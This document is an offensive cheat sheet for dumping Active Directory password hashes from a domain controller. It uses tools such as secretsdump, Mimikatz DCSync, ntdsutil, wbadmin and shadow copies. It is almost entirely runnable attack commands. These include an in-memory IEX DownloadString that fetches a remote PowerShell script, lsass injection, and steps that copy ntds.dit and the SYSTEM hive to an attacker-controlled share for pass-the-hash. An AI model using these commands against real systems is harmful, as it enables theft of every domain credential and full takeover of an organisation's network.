# Dump NTDS from Domain Controller

## Tools: CrackMapExec/Netexec , secretsdump , ntdsutil , metasploit , certsync

    netexec smb DC_IP -u USER -p PASSWORD -d DOMAIN --ntds

    impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP -just-dc-ntlm

    windows/gather/credentials/domain_hashdump (Metasploit)

    certsync -u USER -p PASSWORD -d DOMAIN -dc-ip DC_IP -ns NAMESERVER_IP

    use auxiliary/admin/smb/psexec_ntdsgrab (Metasploit)

### Invoke-DCSync

##### Load into memory

    IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-DCSync.ps1")

##### Execute

    Invoke-DCSync -dcfqdn DC01.security.local -username administrator

### Mimikatz

##### Dump hashes for a specified users

    Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /user:moe"'

##### Dump hashes for all users

    Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /all"'

##### Dump hashes by injecting into the lsass process on the Domain Controller

    Invoke-Mimikatz -command '"lsadump::lsa /inject"'

### PsMapExec

##### As current user

    PsMapExec -Targets DCs -Method SMB -Module NTDS

##### As a specified user

    PsMapExec -Targets DCs -Method SMB -Module NTDS -Username Administrator -Password Password123!


### NTDSUtil

    ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q (On the DC)

    impacket-secretsdump -ntds NTDS_FILE.dit -system SYSTEM_FILE -hashes LMHASH:NTHASH LOCAL -outputfile ntlm-extract

### With these techniques you can move everywhere within the entire domain, as well as possibly compromise the Enterprise Admin (in this case it's game over)

# DUMP DOMAIN CONTROLLER HASHES LOCALLY WITH NTDSUTIL

## required files: 

### 1) C:\windows\NTDS\ntds.dit

### 2) C:\windows\system32\config\SYSTEM

### 3) C:\windows\system32\config\SECURITY

## Locating the ntds custom location: reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"

#### 1) 

    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

#### 2) Transfer them to attacking machine

#### 3) 

    python3 Impacket-Secretsdump.py -security /path/to/SECURITY -system /path/to/SYSTEM -ntds path/to/ntds.dit local

# DUMP DOMAIN CONTROLLER HASHES WITH WBADMIN

#### 1) Create an new user that maches the "force user" parameter in the /etc/samba/smb.conf file:

#### 

    adduser smbuser

#### 

    smbpasswd -a smbuser

#### 

    sudo service smbd restart 

#### 2) Mount the share

    net use k: \\OUR_IP\SHARE /user:smbuser smbpass 

#### 3) Backup NTDS folder

    echo "Y" | wbadmin start backup -backuptarget:\\OUR_IP\SHARE -include:c:\windows\ntds 

#### 4) Retrieve the version of the backup

    sbadmin get versions 

#### 5) Restore the NTDS file, specifying the backup version

    echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl 

#### 6) Export the system hive

    reg save HKLM\SYSTEM C:\system.hive 

#### 7) Transfer the ntds.dit file to our share

    cp ntds.dit \\OUR_IP\SHARE\NTDS.dit

#### 8) Transfer the system hive to our share

    cp system.hive \\OUR_IP\\SHARE\system.hive

#### 9) Dump hashes from NTDS

    impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL

#### 10) Do a Pass-the-Hash attack with wmiexec/smbexec/psexec or evil-winrm 

#### 11) PROFIT

# CRACKMAPEXEC

#### 1) 

    crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds

#### 2) 

    crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi

#### 3) 

    crackmapexec smb 10.10.0.202 -u username -p password --ntds vss

# VOLUME SHADOW COPY (VSS)

#### 1) 

    vssadmin create shadow /for=C:

#### 2) 

    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy

#### 3) 

    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy

# NTDS Reversible Encryption

### UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED (0x00000080), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.

### The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin. This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.

#### 1) List users with "Store passwords using reversible encryption" enabled

    Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

### The password retrieval is already handled by SecureAuthCorp/secretsdump.py and mimikatz, it will be displayed as CLEARTEXT.

